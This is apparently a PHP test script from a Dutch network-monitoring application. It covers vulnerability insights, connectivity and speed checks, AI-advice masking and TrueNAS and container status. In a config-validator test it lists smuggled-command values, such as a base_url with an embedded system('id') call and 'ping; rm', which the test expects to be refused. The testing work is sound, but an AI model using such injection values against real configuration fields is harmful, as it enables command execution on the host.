q("INSERT INTO agent_data (host_id, metric, value, updated_at) VALUES (?, 'ports', '[{\"port\":22,\"addr\":\"0.0.0.0\",\"proc\":\"sshd\"}]', NOW()) ON DUPLICATE KEY UPDATE value = VALUES(value)", [$fa]);
q("INSERT INTO vuln_findings (host_id, package, version, source, vuln_id, cve, fixed_version, first_seen, notified) VALUES (?, 'openssh-server', '1:9.2p1-2', 'openssh', 'DEBIAN-CVE-2099-0001', 'CVE-2099-0001', '1:9.2p1-2+deb12u3', NOW(), 1)", [$fa]);
q("INSERT INTO vuln_cve (cve, severity, cvss, epss, kev, kev_added) VALUES ('CVE-2099-0001', 4, 9.8, 0.9, 1, CURDATE()) ON DUPLICATE KEY UPDATE kev = 1");
save_setting('net_scan', '1');
$vulnWas = (string) setting('vuln_enabled', '0');
save_setting('vuln_enabled', '1');
q("INSERT INTO net_devices (mac, ip, kind, status, ports, info, first_seen, last_seen) VALUES ('aa:bb:cc:00:11:22', '192.0.2.77', 'camera', 'known', '[22,80]',
   '{\"banners\":{\"22\":\"SSH-2.0-OpenSSH_7.4\"},\"http\":{\"port\":80,\"server\":\"Boa/0.94.14rc21\"}}', NOW(), NOW())");
$ins = Insights::compute();
$byKey = array_column($ins, null, 'key');
$vs = $byKey["vuln_service|$fa|openssh-server"] ?? null;
$bn = array_values(array_filter($ins, fn($x) => str_starts_with($x['key'], 'banner|aa:bb:cc:00:11:22')));
ok($vs && $vs['sev'] === 2 && $vs['crit'] && str_contains(implode(' ', $vs['why']), '1:9.2p1-2+deb12u3') && str_contains(implode(' ', $vs['why']), 'poort 22')
    && !isset($byKey['vuln_important|CVE-2099-0001']) && isset($byKey["eol|$fa"]) && count($bn) === 2,
    'analyse: kwetsbare dienst (poort → pakket → CVE met KEV, opgelost-in), niet nog eens als losse CVE; Debian 10 zonder ondersteuning; verouderde OpenSSH en Boa op een apparaat zonder agent');
$ins1 = Insights::page();
Insights::setStatus("eol|$fa", 'na', 'ci');
$ins2 = Insights::page();
q("DELETE FROM vuln_findings WHERE cve = 'CVE-2099-0001'");
save_setting('insight_at', '0');
Insights::cron();
$res = (string) q('SELECT resolved_at FROM insight_state WHERE k = ?', ["vuln_service|$fa|openssh-server"])->fetchColumn();
$notified = (string) q('SELECT notified_at FROM insight_state WHERE k = ?', ["vuln_service|$fa|openssh-server"])->fetchColumn();
ok($ins2['domains']['vulns'] > $ins1['domains']['vulns'] && $res !== '' && $ins1['score'] >= 0 && !Insights::setStatus('x', 'kapot', 'ci') && $notified === '',
    'analyse: "niet van toepassing" telt niet in de score; na de update is het advies opgelost; onbekende status geweigerd');
save_setting('net_scan', '0');
save_setting('vuln_enabled', $vulnWas);
$ie = AttackFlow::ipEvents('198.51.100.23', 1);
$kinds = array_count_values(array_column($ie['rows'], 'k'));
ok(($kinds['fail'] ?? 0) === 2 && ($kinds['block'] ?? 0) === 1 && ($kinds['inc'] ?? 0) === 1 && $ie['counts']['fails'] === 2 && count($ie['blocks']) === 1
    && $ie['blocks'][0]['host'] === 'ci-af-a' && in_array('ci-af-b', $ie['not_blocked_on'], true) && $ie['explain'] !== null && $ie['incidents'][0]['observed'],
    'popup per IP: elke poging, de blokkade, de melding, waar het geblokkeerd is en waar nog niet, met de uitleg');
q("DELETE FROM hosts WHERE name IN ('ci-af-a', 'ci-af-b')");

section('Internet (1.157.0)');
$ck = ['warn_threshold' => 50, 'crit_threshold' => 150];
$pr = Internet::parsePing("64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=4.10 ms\n64 bytes from 1.1.1.1: icmp_seq=2 ttl=57 time=5.10 ms\n5 packets transmitted, 2 received, 60% packet loss");
ok(abs($pr['avg'] - 4.6) < .01 && abs($pr['jitter'] - 1.0) < .01 && $pr['loss'] == 60.0 && $pr['sent'] === 5, 'ping lezen: gemiddelde, jitter en verlies');
$good = ['times' => [4, 5], 'avg' => 4.5, 'loss' => 0.0, 'jitter' => 1.0, 'sent' => 5];
$dead = ['times' => [], 'avg' => null, 'loss' => 100.0, 'jitter' => 0.0, 'sent' => 5];
$r1 = Internet::pingResult($ck, ['1.1.1.1' => $good, '8.8.8.8' => $good, '192.168.1.1' => ['avg' => .4] + $good], '192.168.1.1');
$r2 = Internet::pingResult($ck, ['1.1.1.1' => $dead, '8.8.8.8' => $dead, '192.168.1.1' => ['avg' => .4] + $good], '192.168.1.1');
$r3 = Internet::pingResult($ck, ['1.1.1.1' => $dead, '8.8.8.8' => $dead, '192.168.1.1' => $dead], '192.168.1.1');
$r4 = Internet::pingResult($ck, ['1.1.1.1' => $good, '8.8.8.8' => $dead], null);
ok($r1['status'] === STATUS_OK && $r1['value'] == 4.5 && str_contains($r1['message'], 'router'), 'internet ping: OK met de router erbij');
ok($r2['status'] === STATUS_CRIT && str_contains($r2['message'], 'antwoordt wel') && $r3['status'] === STATUS_CRIT && str_contains($r3['message'], 'eigen netwerk'),
    'geen internet: router wel of niet bereikbaar maakt verschil in de melding');
ok($r4['status'] === STATUS_WARN, 'één van de twee adressen weg = warning');
$rr = Internet::respResult(['warn_threshold' => 500, 'crit_threshold' => 2000], ['https://www.google.com/generate_204' => ['dns' => 10, 'conn' => 20, 'tls' => 40, 'ttfb' => 60],
    'https://www.cloudflare.com/cdn-cgi/trace' => ['error' => 'timeout']]);
ok($rr['status'] === STATUS_WARN && $rr['value'] == 60.0 && str_contains($rr['message'], 'google.com'), 'responstijd: één site weg = warning, gemiddelde van de rest');
ok(Internet::times('9:30, 03:30 25:00 13.30 9:30') === ['03:30', '09:30', '13:30'] && Internet::cleanTimes('x') === Internet::TIMES, 'tijden van de snelheidstest netjes gemaakt');
ok(Smart::eligible(['type' => 'internet', 'metric' => 'ping']) && !Smart::eligible(['type' => 'internet', 'metric' => 'down']), 'internet: ping leert mee, snelheid niet');
// Eén klik: apparaat met vier checks; nog een keer = niets dubbel
$ih = Internet::install();
Internet::install();
ok((int) q("SELECT COUNT(*) FROM checks WHERE host_id = ? AND type = 'internet'", [$ih])->fetchColumn() === 4, 'Internet toevoegen: één apparaat met vier checks');
$down = q("SELECT * FROM checks WHERE host_id = ? AND metric = 'down'", [$ih])->fetch();
ok(Internet::run($down)['status'] === STATUS_UNKNOWN && Internet::due(), 'nog geen snelheidstest: onbekend, en meteen aan de beurt');
// Snelheidstest tegen een nep-testserver
$port = 18000 + random_int(0, 999);
$srv = proc_open(['env', 'PHP_CLI_SERVER_WORKERS=4', PHP_BINARY, '-S', "127.0.0.1:$port", __DIR__ . '/fake-speed.php'], [1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']], $pp);
for ($i = 0; $i < 50 && !@fsockopen('127.0.0.1', $port); $i++) {
    usleep(100000);
}
save_setting('inet_speed_url', "http://127.0.0.1:$port");
save_setting('inet_speed_mb', '20');
$sp = Internet::speedtest();
ok($sp['err'] === null && $sp['down'] > 1 && $sp['up'] > 1 && $sp['colo'] === 'AMS' && $sp['mb_down'] >= 20, 'snelheidstest: download, upload, locatie (' . json_encode($sp) . ')');
save_setting('inet_down', '100000');
save_setting('inet_warn_pct', '70');
save_setting('inet_crit_pct', '40');
$rd = Internet::run($down);
ok($rd['value'] == $sp['down'] && str_contains($rd['message'], 'van 100000') && ($rd['status'] === STATUS_CRIT || $sp['down'] >= 40000), 'download vergeleken met het abonnement');
ok(!Internet::due(), 'na de test: niet meteen nog een');
save_setting('inet_speed_url', 'http://127.0.0.1:1');
$bad = Internet::speedtest();
ok($bad['err'] !== null && Internet::run($down)['status'] === STATUS_UNKNOWN, 'testserver weg: test mislukt, check onbekend met de reden');
proc_terminate($srv);
proc_close($srv);
q('DELETE FROM hosts WHERE id = ?', [$ih]);
q('DELETE FROM inet_speed');
save_setting('inet_speed_url', 'https://speed.cloudflare.com');
save_setting('inet_down', '1000');

section('Grote instellingen (1.157.4)');
$big = json_encode(array_map(static fn($i) => "homeassistant/sensor/rzmon_check_$i/config", range(1, 4000)));
save_setting('mqtt_topics', $big);
ok(strlen($big) > 65535 && q("SELECT value FROM settings WHERE name = 'mqtt_topics'")->fetchColumn() === $big, 'een lijst MQTT-topics groter dan 64 KB wordt bewaard (' . round(strlen($big) / 1024) . ' KB)');
save_setting('mqtt_topics', '[]');

section('config.php via de hulpdienst (1.168.0)');
$refused = 0;
foreach ([['evil' => 'x'], ['base_url' => "http://x'.system('id').'"], ['ping_bin' => 'ping; rm'], ['db' => ['host' => 'a;b', 'name' => 'x', 'user' => 'y']],
          ['php' => ['memory_limit' => '1G; x']], ['timezone' => 'Mars/Olympus']] as $bad) {
    try { Installer::cleanConfigChanges($bad); } catch (InvalidArgumentException $e) { $refused++; }
}
ok($refused === 6, 'onbekende velden en vreemde waarden worden geweigerd (' . $refused . '/6)');
$okc = Installer::cleanConfigChanges(['timezone' => 'Europe/Brussels', 'base_url' => 'http://192.168.2.207', 'php' => ['memory_limit' => '256M', 'max_execution_time' => '', 'display_errors' => '0'],
    'db' => ['host' => '127.0.0.1', 'port' => '3306', 'name' => 'rzmon', 'user' => 'rzmon', 'pass' => "a'b\"c\\d"]]);
$tmpCfg = tempnam(sys_get_temp_dir(), 'rzcfg');
file_put_contents($tmpCfg, Installer::renderConfig($okc));
$back = include $tmpCfg;
unlink($tmpCfg);
ok($okc['db']['port'] === 3306 && $okc['db']['pass'] === "a'b\"c\\d" && ($back['db']['pass'] ?? null) === "a'b\"c\\d",
    'geldige waarden blijven, een wachtwoord met aanhalingstekens komt ongeschonden in config.php');

section('Beschikbaarheid per groep (1.169.0)');
ok(Availability::allDown([[0, 10, false], [5, 20, true]], 2) === [[5, 10, false]], 'een storing telt pas als alle bereikbaarheidschecks tegelijk CRITICAL zijn');
ok(Availability::allDown([[0, 10, false], [5, 20, true]], 1) === [[0, 20, true]], 'met één check per keer: overlappende stukken worden één storing die nog bezig is');
q("INSERT INTO hosts (name, address, mode, grp) VALUES ('av-test', '192.0.2.9', 'remote', 'Thuis')");
$avH = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, name, status) VALUES (?, 'ping', 'Ping', 0)", [$avH]);
$avC = (int) db()->lastInsertId();
for ($i = 1; $i <= 10; $i++) {
    q('INSERT INTO results (check_id, status, created_at) VALUES (?, ?, NOW() - INTERVAL ? MINUTE)', [$avC, $i <= 2 ? 2 : 0, $i * 60 + 30]);
}
q('INSERT INTO status_changes (check_id, from_status, to_status, created_at) VALUES (?, 0, 2, NOW() - INTERVAL 3 HOUR), (?, 2, 0, NOW() - INTERVAL 2 HOUR)', [$avC, $avC]);
$av = Availability::report(1)['hosts'][$avH] ?? null;
ok($av !== null && abs($av['pct'] - 80.0) < 0.01 && $av['n'] === 1 && abs($av['down_s'] - 3600) <= 2 && !$av['open'] && count($av['series']) === 24,
    '24 uur: 80% beschikbaar, één storing van een uur, 24 uurblokjes (' . json_encode($av ? [$av['pct'], $av['n'], $av['down_s']] : null) . ')');
q('INSERT INTO status_changes (check_id, from_status, to_status, created_at) VALUES (?, 0, 2, NOW() - INTERVAL 10 MINUTE)', [$avC]);
$av = Availability::report(7)['hosts'][$avH] ?? null;
ok($av !== null && $av['n'] === 2 && $av['open'] && count($av['series']) === 7, '7 dagen: een storing die nog bezig is telt mee, 7 dagblokjes');
q('DELETE FROM hosts WHERE id = ?', [$avH]);

section('Domein, MQTT en VPN (1.170.0)');
ok(NetChecks::domainName('https://www.Example.NL/pad') === 'example.nl' && NetChecks::domainName('mijn.domein.nl.') === 'mijn.domein.nl'
    && NetChecks::domainName('geen domein') === null && NetChecks::domainName('a.b') === null, 'domeinnaam uit een URL, met www en punt erachter; onzin geweigerd');
$rd = NetChecks::rdapParse(['status' => ['active', 'client transfer prohibited'], 'events' => [['eventAction' => 'registration', 'eventDate' => '2010-01-01T00:00:00Z'],
    ['eventAction' => 'expiration', 'eventDate' => gmdate('Y-m-d\TH:i:s\Z', time() + 20 * 86400 + 3600)]],
    'entities' => [['roles' => ['registrar'], 'vcardArray' => ['vcard', [['version', [], 'text', '4.0'], ['fn', [], 'text', 'Voorbeeld Registrar BV']]]]]]);
$dc = ['warn_threshold' => 30, 'crit_threshold' => 14];
$r = NetChecks::domainResult($dc, $rd + ['name' => 'example.nl']);
ok($r['status'] === STATUS_WARN && $r['value'] === 20.0 && str_contains($r['message'], 'Voorbeeld Registrar BV'), 'RDAP: verloopt over 20 dagen = WARNING (drempel 30), met de registrar');
$r = NetChecks::domainResult($dc, ['exp' => null, 'status' => ['active'], 'registrar' => '', 'name' => 'sidn.nl']);
ok($r['status'] === STATUS_OK && $r['value'] === null, 'zonder verloopdatum (zoals .nl): OK zolang de status actief is');
$r = NetChecks::domainResult($dc, ['exp' => time() + 300 * 86400, 'status' => ['pending delete'], 'registrar' => '', 'name' => 'x.com']);
ok($r['status'] === STATUS_CRIT, 'status pending delete = CRITICAL, ook als de verloopdatum ver weg is');
ok(NetChecks::domainResult($dc, ['missing' => true, 'name' => 'weg.com'])['status'] === STATUS_CRIT, 'domein niet gevonden bij de registry = CRITICAL');
ok(NetChecks::gluetunResult('running', ['public_ip' => '185.65.134.1', 'country' => 'Netherlands'], '84.1.2.3', '')['status'] === STATUS_OK
    && NetChecks::gluetunResult('running', ['public_ip' => '84.1.2.3'], '84.1.2.3', '')['status'] === STATUS_CRIT
    && NetChecks::gluetunResult('stopped', [], null, '')['status'] === STATUS_CRIT
    && NetChecks::gluetunResult('running', ['public_ip' => '185.65.134.1', 'country' => 'Netherlands'], null, 'Belgium')['status'] === STATUS_WARN,
    'Gluetun: draait = OK, eigen IP = lek (CRITICAL), gestopt = CRITICAL, ander land = WARNING');
$wc = ['target' => '', 'warn_threshold' => 300, 'crit_threshold' => 900];
$peers = [['id' => 'wg0:AbCd', 'iface' => 'wg0', 'peer' => 'AbCd', 'hs' => 70, 'rx' => 1000, 'tx' => 2000], ['id' => 'wg0:XyZ', 'iface' => 'wg0', 'peer' => 'XyZ', 'hs' => 1200]];
$r = NetChecks::wgResult($wc, $peers);
ok($r['status'] === STATUS_CRIT && $r['value'] === 1200.0, 'WireGuard: de oudste handshake telt (20 min = CRITICAL)');
ok(NetChecks::wgResult(['target' => 'wg0:AbCd'] + $wc, $peers)['status'] === STATUS_OK, 'WireGuard: één peer gekozen, handshake 70 s geleden = OK');
ok(NetChecks::wgResult($wc, [['id' => 'wg1:Q', 'iface' => 'wg1', 'peer' => 'Q', 'hs' => -1]])['status'] === STATUS_CRIT, 'WireGuard: nog nooit een handshake = CRITICAL');
ok(NetChecks::wgResult(['target' => 'wg9'] + $wc, $peers)['status'] === STATUS_UNKNOWN, 'WireGuard: onbekende interface = onbekend');
$mq = NetChecks::run(['id' => 0, 'type' => 'mqtt', 'target' => '127.0.0.1:1', 'options' => '{}', 'warn_threshold' => 500, 'crit_threshold' => 2000, 'metric' => null],
    ['id' => 0, 'address' => '127.0.0.1', 'mode' => 'remote']);
ok($mq['status'] === STATUS_CRIT && str_contains($mq['message'], '127.0.0.1:1'), 'MQTT: broker niet bereikbaar = CRITICAL met het adres');
ok(ExtraChecks::maskOptions('{"user":"rz","pass":"geheim"}') === '{"user":"rz","pass":"' . ExtraChecks::MASK . '"}', 'MQTT- en Gluetun-wachtwoord gaan gemaskeerd naar de browser');

section('AI-advies (1.171.0)');
[$m, $map] = Ai::mask("web01.thuis.lan (192.168.1.10) meldt: web01 down, mail beheer@voorbeeld.nl, fe80::1 en 2001:db8::5", ['web01.thuis.lan', 'web01']);
ok(!str_contains($m, 'web01') && !str_contains($m, '192.168.1.10') && !str_contains($m, 'beheer@') && !str_contains($m, '2001:db8::5') && str_contains($m, 'server-1'),
    'maskeren: servernamen, IPv4, IPv6 en e-mail worden labels (' . $m . ')');
ok(Ai::unmask('Herstart de dienst op server-2 en kijk naar ip-1.', $map) === 'Herstart de dienst op web01 en kijk naar 192.168.1.10.', 'labels in het antwoord worden weer de echte namen');
$sc = Ai::scrub("password=geheim123 token: abc\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.x\n-----BEGIN " . "PRIVATE KEY-----\nMIIE\n-----END " . "PRIVATE KEY-----\napi_key=\"sk-abcdefghijklmnopqrst\"");
ok(!preg_match('/geheim123|abc\b|eyJhbG|MIIE|sk-abcdef/', $sc), 'geheimen gaan eruit: wachtwoord, token, Bearer, privésleutel, API-sleutel');
[$txt, $act] = Ai::parseAction("### Oplossing\nHerstart.\nACTIE: restart", ['restart']);
[, $act2] = Ai::parseAction("Doe iets.\nACTIE: cmd:rm-all", ['restart']);
ok($act === 'restart' && !str_contains($txt, 'ACTIE') && $act2 === null, 'een voorgestelde actie telt alleen als hij in de lijst staat; de regel verdwijnt uit de tekst');
save_setting('ai_on', '0');
$off = false;
try { Ai::ask('check', 1, 'test'); } catch (RuntimeException $e) { $off = true; }
ok($off && Ai::stateInfo(['role' => 'admin']) === null && Ai::diagLines(1) === [], 'AI uit: niets vragen, niets in de status voor de browser, geen diagnose naar de agent');
save_setting('ai_on', '1');
save_setting('ai_provider', 'ollama');
save_setting('ai_ollama_model', 'test');
q("INSERT INTO hosts (name, address, mode) VALUES ('ai-host', '192.0.2.50', 'remote')");
$aiH = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, name, target, status, last_message, problem_since) VALUES (?, 'tcp', 'SSH', '22', 2, 'Poort 22 onbereikbaar', NOW())", [$aiH]);
$aiC = (int) db()->lastInsertId();
$ctx = Ai::context('check', $aiC);
ok(str_contains($ctx['text'], 'ai-host') && str_contains($ctx['text'], 'Poort 22 onbereikbaar') && ($ctx['diag']['via'] ?? '') === 'rzmon' && $ctx['actions'] === [],
    'context van een check: server, melding, netwerkdiagnose door RzSense (geen agent), geen herstelacties');
q('DELETE FROM hosts WHERE id = ?', [$aiH]);
save_setting('ai_on', '0');
[, , $rb] = Ai::request(['provider' => 'openai', 'url' => 'x', 'key' => 'k', 'model' => 'o3-2025-04-16', 'max_tokens' => 1500], 's', 'p');
[, , $nb] = Ai::request(['provider' => 'openai', 'url' => 'x', 'key' => 'k', 'model' => 'gpt-4.1-mini', 'max_tokens' => 1500], 's', 'p');
ok($rb['max_completion_tokens'] > 1500 && ($rb['reasoning_effort'] ?? '') === 'low' && $nb['max_completion_tokens'] === 1500 && !isset($nb['reasoning_effort']),
    'redeneermodel (o3) krijgt ruimte om na te denken en weinig denkwerk; een gewoon model niet');
$noAns = false;
[$pt, , , $ps] = Ai::parse('openai', ['choices' => [['message' => ['content' => ''], 'finish_reason' => 'length']]]);
ok($pt === '' && $ps === 'length' && Ai::parse('gemini', ['candidates' => [['content' => ['parts' => [['text' => 'denk', 'thought' => true], ['text' => 'antwoord']]]]]])[0] === 'antwoord',
    'antwoord lezen: lege tekst met de reden, denkstappen van Gemini weggelaten');
ok(Ai::suggestModel(Ai::sortModels(['o4-mini-2025-04-16', 'o3', 'gpt-5-mini', 'gpt-5'])) === 'gpt-5-mini' && Ai::suggestModel(Ai::sortModels(['gemini-2.5-pro', 'gemini-2.5-flash'])) === 'gemini-2.5-flash',
    'modellen ophalen: zonder datum eerst, voorstel een zuinig model (niet "gemini" als mini)');

// 1.173.0: AI-advies: oordeel, samenvatting, kosten, tegoed, budget met terugvallen op Ollama, niet twee keer betalen, geheugen
$ans = "### Wat is er aan de hand\nDe dienst ligt stil.\n### Waarschijnlijke oorzaak\nDe schijf is vol. Daardoor start hij niet.\n### Oplossing\n1. Ruim op.";
ok(Ai::verdict("OORDEEL: onschuldig\nREDEN: Een update.") === 'benign' && Ai::verdict('VERDICT: suspicious') === 'suspect' && Ai::verdict('OORDEEL: **echt**') === 'real' && Ai::verdict('weet niet') === null
    && Ai::reason("OORDEEL: verdacht\nREDEN: Onbekend IP op poort 22.") === 'Onbekend IP op poort 22.' && Ai::summary($ans) === 'De schijf is vol.' && Ai::section($ans, ['Oplossing']) === '1. Ruim op.',
    'AI: oordeel en reden uit het antwoord, samenvatting = de oorzaak in één zin, een kopje uit het antwoord');
Ai::saveCost(['grok|ci-model' => [2, 10], 'ollama|x' => [1, 1], 'nep|y' => [1, 1], 'grok|bad model!' => [1, 1]], ['grok' => ['amount' => 3, 'since' => date('Y-m-d')], 'ollama' => ['amount' => 5]]);
$pr = json_decode((string) setting('ai_prices'), true);
ok(array_keys($pr) === ['grok|ci-model'] && Ai::costOf('grok', 'ci-model', 1000000, 100000) === 3.0 && Ai::costOf('grok', 'onbekend', 10, 10) === null && Ai::costOf('ollama', 'x', 10, 10) === 0.0
    && array_keys(json_decode((string) setting('ai_credit'), true)) === ['grok'],
    'AI: prijzen alleen voor cloudmodellen met een geldige naam; kosten uitgerekend; Ollama gratis; tegoed alleen bij een cloudaanbieder');
foreach (['ai_on' => '1', 'ai_provider' => 'grok', 'ai_grok_key' => 'xai-ci', 'ai_grok_model' => 'ci-model', 'ai_ollama_model' => 'ci-ollama', 'ai_budget_month' => '1', 'ai_fallback' => '1', 'ai_cache' => '1'] as $k => $v) {
    save_setting($k, $v);
}
q("INSERT INTO ai_advice (kind, ref_id, status, provider, model, cost, created_at, done_at) VALUES ('check', 999999, 'done', 'grok', 'ci-model', 1.5, NOW(), NOW())");
$cr = Ai::credits()['grok'] ?? null;
[$rc, $rn] = Ai::route();
save_setting('ai_fallback', '0');
$stop = null;
try { Ai::route(); } catch (RuntimeException $e) { $stop = $e->getMessage(); }
save_setting('ai_fallback', '1');
ok($cr && abs($cr['left'] - 1.5) < 0.001 && $cr['pct'] === 50 && $rc['provider'] === 'ollama' && str_contains((string) $rn, 'Ollama') && $stop !== null && str_contains($stop, 'budget'),
    'AI: tegoed min de kosten; maandbudget op → naar Ollama (met de reden), zonder terugvallen stopt het');
q("INSERT INTO hosts (name, address, mode) VALUES ('ai-host2', '192.0.2.51', 'remote')");
$aiH2 = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, name, target, status, last_message, problem_since) VALUES (?, 'tcp', 'SSH', '22', 2, 'Poort 22 dicht', NOW() - INTERVAL 1 HOUR)", [$aiH2]);
$aiC2 = (int) db()->lastInsertId();
$a1 = Ai::ask('check', $aiC2, 'ci');
q("UPDATE ai_advice SET status = 'done', answer = ? WHERE id = ?", [$ans, $a1['id']]);
$a2 = Ai::ask('check', $aiC2, 'ci');
Ai::feedback((int) $a1['id'], 1, true, 'ci');
$mem = (new ReflectionMethod(Ai::class, 'memory'))->invoke(null, 'check', $aiC2, 0);
q("UPDATE checks SET problem_since = NOW() + INTERVAL 1 MINUTE WHERE id = ?", [$aiC2]);   // een nieuwe storing
$a3 = Ai::ask('check', $aiC2, 'ci');
ok($a1['provider'] === 'ollama' && str_contains((string) $a1['note'], 'budget') && $a2['id'] === $a1['id'] && $a3['id'] !== $a1['id']
    && str_contains($mem, 'loste het op') && str_contains($mem, 'Ruim op'),
    'AI: dezelfde storing = hetzelfde advies, een nieuwe storing een nieuw; feedback gaat als geheugen mee bij de volgende vraag');
$blk = false;
save_setting('ai_report', '0');
try { Ai::ask('report', 1, 'ci'); } catch (RuntimeException $e) { $blk = true; }
ok($blk, 'AI: een extra die uit staat (verslag) kan niet gevraagd worden');
q('DELETE FROM ai_advice');
q('DELETE FROM hosts WHERE id = ?', [$aiH2]);
foreach (['ai_on' => '0', 'ai_provider' => 'ollama', 'ai_budget_month' => '0', 'ai_report' => '1', 'ai_prices' => '{}', 'ai_credit' => '{}'] as $k => $v) {
    save_setting($k, $v);
}

// 1.174.0: TrueNAS SCALE: herkennen, uitlezen (meldingen, taken, apps, update, temperatuur), kwetsbaarheden en IDS-blokkeren
q("INSERT INTO hosts (name, address, mode, agent_seen, agent_version) VALUES ('ci-truenas', '192.0.2.60', 'agent', NOW(), '1.77.0')");
$tnH = (int) db()->lastInsertId();
$tnSt = db()->prepare('INSERT INTO agent_data (host_id, metric, value, updated_at) VALUES (?, ?, ?, ?) ON DUPLICATE KEY UPDATE value = VALUES(value), updated_at = VALUES(updated_at)');
$tnIsBefore = Truenas::is($tnH);
$tnSt->execute([$tnH, 'cfg', json_encode(['sched' => 'truenas']), now()]);
Truenas::fromAgent(['id' => $tnH], ['version' => 'TrueNAS-27.0.0', 'at' => time(),
    'alerts' => [['level' => 'CRITICAL', 'formatted' => 'Pool <b>tank</b> is DEGRADED', 'dismissed' => false], ['level' => 'WARNING', 'formatted' => 'weg', 'dismissed' => true]],
    'repl' => [['id' => 1, 'name' => 'naar backup', 'enabled' => true, 'state' => ['state' => 'ERROR', 'error' => 'No route to host']]],
    'snap' => [['id' => 2, 'dataset' => 'tank', 'enabled' => true, 'state' => ['state' => 'FINISHED']]], 'cloud' => [], 'rsync' => [],
    'apps' => [['name' => 'plex', 'state' => 'RUNNING', 'upgrade_available' => true], ['name' => 'nc', 'state' => 'STOPPED']],
    'temps' => ['sda' => 41, 'sdb' => 62], 'update' => ['status' => 'AVAILABLE', 'version' => '27.0.1']], $tnSt, now());
$tnHost = q('SELECT * FROM hosts WHERE id = ?', [$tnH])->fetch();
$tc = static fn($m, $t = '', $w = null, $c = null) => Truenas::check(['metric' => $m, 'target' => $t, 'warn_threshold' => $w, 'crit_threshold' => $c], $tnHost);
[$aS, , $aM] = $tc('alerts');
[$tS, , $tM] = $tc('tasks');
[$apS] = $tc('apps');
[$ap1S] = $tc('apps', 'nc');
[$uS] = $tc('update');
[$teS, $teV] = $tc('temp', '', 50, 60);
ok(!$tnIsBefore && Truenas::is($tnH) && $aS === STATUS_CRIT && str_contains($aM, 'Pool tank is DEGRADED') && !str_contains($aM, 'weg')
    && $tS === STATUS_CRIT && str_contains($tM, 'No route to host') && $apS === STATUS_OK && $ap1S === STATUS_CRIT && $uS === STATUS_WARN && $teS === STATUS_CRIT && $teV === 62.0,
    'TrueNAS: herkend; CRITICAL-melding (weggeklikte niet), mislukte replicatie, gestopte app alleen als je hem apart bewaakt, update = WARNING, warmste schijf telt');
$deb = Vulns::derivedEcosystem('truenas', 'TrueNAS 27.0.0-RC.1', '', [['base-files', '13.8+deb13u1'], ['bash', '5.2']]);
$noUbuntu = Vulns::derivedEcosystem('pop', 'Pop!_OS', 'ubuntu debian', [['base-files', '13ubuntu10']]);
q('UPDATE hosts SET truenas_fw = 1 WHERE id = ?', [$tnH]);
$tnLines = Ids::agentLines($tnH);
ok($deb === 'Debian:13' && $noUbuntu === null && Vulns::upgradeBlocked($tnHost) !== null && str_contains((string) Vulns::upgradeBlocked($tnHost), 'TrueNAS')
    && in_array("0\ttruenas_fw\t1", $tnLines, true),
    'TrueNAS: kwetsbaarheden als de Debian eronder (base-files), Ubuntu-achtigen niet; nooit bijwerken met apt; blokkeren toegestaan = regel voor de agent');
// 1.176.0: containers: Running / Failed / Stopped / Paused, Stopped (netjes, exitcode 0) is WARNING; overzicht en popup-extra's
$cs = static fn($st, $code = 0, $health = '') => Checks::containerState(['state' => $st, 'exit_code' => $code, 'health' => $health]);
$ctC = ['id' => 0, 'type' => 'container', 'target' => 'web', 'metric' => 'status', 'warn_threshold' => null, 'crit_threshold' => null, 'options' => null];
$tnSt->execute([$tnH, 'podman', json_encode(['version' => '5.2', 'images_size' => 1e9, 'volumes_size' => 2e9, 'reclaimable' => 5e8, 'pods' => []]), now()]);
$ctRun = static function (array $c) use ($tnSt, $tnH, $ctC, $tnHost) { $tnSt->execute([$tnH, 'container:web', json_encode(['name' => 'web', 'user' => 'root', 'image' => 'nginx'] + $c), now()]); return Checks::run($ctC, $tnHost); };
$rStop = $ctRun(['state' => 'exited', 'exit_code' => 0]);
$rFail = $ctRun(['state' => 'exited', 'exit_code' => 137]);
$rSick = $ctRun(['state' => 'running', 'health' => 'unhealthy']);
$rOk = $ctRun(['state' => 'running', 'started' => time() - 3600, 'cpu' => 1.5, 'mem' => 1e8, 'mem_limit' => 5e8]);
$ov = Containers::overview();
$ovH = array_values(array_filter($ov['hosts'], fn($h) => $h['id'] === $tnH))[0] ?? null;
ok($cs('running') === 'running' && $cs('running', 0, 'unhealthy') === 'failed' && $cs('exited') === 'stopped' && $cs('exited', 1) === 'failed' && $cs('paused') === 'paused' && $cs('dead') === 'failed' && $cs('created') === 'stopped'
    && $rStop['status'] === STATUS_WARN && ($rStop['cstate'] ?? '') === 'stopped' && $rFail['status'] === STATUS_CRIT && ($rFail['cstate'] ?? '') === 'failed' && str_contains($rFail['message'], 'OOM')
    && $rSick['status'] === STATUS_CRIT && $rOk['status'] === STATUS_OK && ($rOk['cstate'] ?? '') === 'running'
    && $ovH && count($ovH['containers']) === 1 && $ovH['containers'][0]['state'] === 'running' && $ovH['containers'][0]['mem_pct'] === 20.0,
    'containers: Running/Failed/Stopped/Paused, netjes gestopt = WARNING, foutcode of ongezond = CRITICAL; overzicht met geheugen in procenten');
q("INSERT INTO checks (host_id, type, target, name, interval_sec, status, status_since, status_streak) VALUES (?, 'container', 'web', 'web', 60, 2, NOW() - INTERVAL 10 MINUTE, 3)", [$tnH]);
$ctId = (int) db()->lastInsertId();
q("INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, 'x', NOW() - INTERVAL 2 DAY), (?, 2, 0, 'y', NOW() - INTERVAL 2 DAY + INTERVAL 30 MINUTE), (?, 0, 2, 'z', NOW() - INTERVAL 10 MINUTE)", [$ctId, $ctId, $ctId]);
q("INSERT INTO results (check_id, status, value, created_at) VALUES (?, 0, 1, NOW() - INTERVAL 2 HOUR), (?, 2, 1, NOW() - INTERVAL 5 MINUTE)", [$ctId, $ctId]);
$ex = CheckInfo::extra(q('SELECT * FROM checks WHERE id = ?', [$ctId])->fetch());
ok($ex['counts']['n24'] === 2 && $ex['counts']['f24'] === 1 && $ex['outages']['count'] === 2 && $ex['outages']['mttr'] === 1800 && $ex['notify']['streak'] === 3
    && ($ex['detail']['kind'] ?? '') === 'container' && $ex['detail']['state'] === 'running',
